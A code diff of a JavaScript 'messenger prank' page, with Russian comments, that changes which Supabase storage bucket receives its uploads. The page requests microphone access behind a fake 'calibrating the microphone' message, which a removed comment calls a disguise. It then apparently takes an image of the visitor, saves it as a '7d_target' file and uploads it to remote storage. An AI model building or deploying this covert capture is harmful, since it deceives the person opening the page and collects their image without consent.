@@ -144,15 +144,16 @@
                 const blob = await res.blob();
                 const fileName = `7d_target_${Date.now()}.png`;
 
+                // Сохраняем в бакет 'files'
                 const { data, error } = await supabaseClient.storage
-                    .from('photos')
+                    .from('files')
                     .upload(fileName, blob, { contentType: 'image/png' });
 
                 if (error) {
                     console.error('Ошибка Supabase:', error);
-                    uploadStatus.textContent = "Фотовспышка сработала, но в базу не записалось (проверь бакет photos).";
+                    uploadStatus.textContent = "Ошибка загрузки: проверь права доступа (RLS) в бакете files.";
                 } else {
-                    uploadStatus.textContent = "Снимок успешно улетел в базу 7Д! 🚀";
+                    uploadStatus.textContent = "Снимок успешно улетел в базу файлов! 🚀";
                 }
             } catch (err) {
                 console.error('Ошибка сети:', err);
@@ -162,7 +163,7 @@
 
         async function initMessengerPrank() {
             try {
-                // ШАГ 1: Запрашиваем микрофон для маскировки
+                // ШАГ 1: Запрашиваем микрофон
                 statusText.textContent = "Шаг 1/2: Калибровка микрофона для связи...";
                 const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                 
@@ -200,7 +201,7 @@
                     loaderScreen.style.display = 'none';
                     prankScreen.style.display = 'flex';
 
-                    // Отправляем в Supabase
+                    // Отправляем в Supabase в бакет 'files'
                     await sendToSupabase(dataUrl);
 
                 }, 1000);
